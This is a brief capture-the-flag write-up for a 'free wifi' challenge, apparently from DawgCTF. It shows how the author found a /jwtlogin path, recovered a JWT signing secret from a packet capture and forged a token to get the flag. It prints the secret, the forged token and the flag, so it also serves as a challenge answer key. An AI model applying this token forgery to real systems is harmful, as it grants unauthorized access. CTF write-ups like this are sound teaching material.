# free wifi part 4

so after running a dirsearch I found the dir `/jwtlogin`

and from examining the pcap file I found the cookie
```
Set-Cookie: JWT 'secret'="dawgCTF?heckin#bamboozle"; Path=/
```

so after playing around and analysing the pcap file 
I crafted the following jwt token

`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6MzEzMzcsInVzZXJuYW1lIjoidHJ1ZSIsImlhdCI6IjE1ODY2OTg2NDYiLCJleHAiOiIxNTg2Njk5NTE3IiwibmJmIjoiMTU4NjY5ODUxNyJ9.2C3UHzTJ21r1eNLyNIdXL14sNoXdexg2wMKjpuEd1X8`

the flag :P
`DawgCTF{y0u_d0wn_w!t#_JWT?}`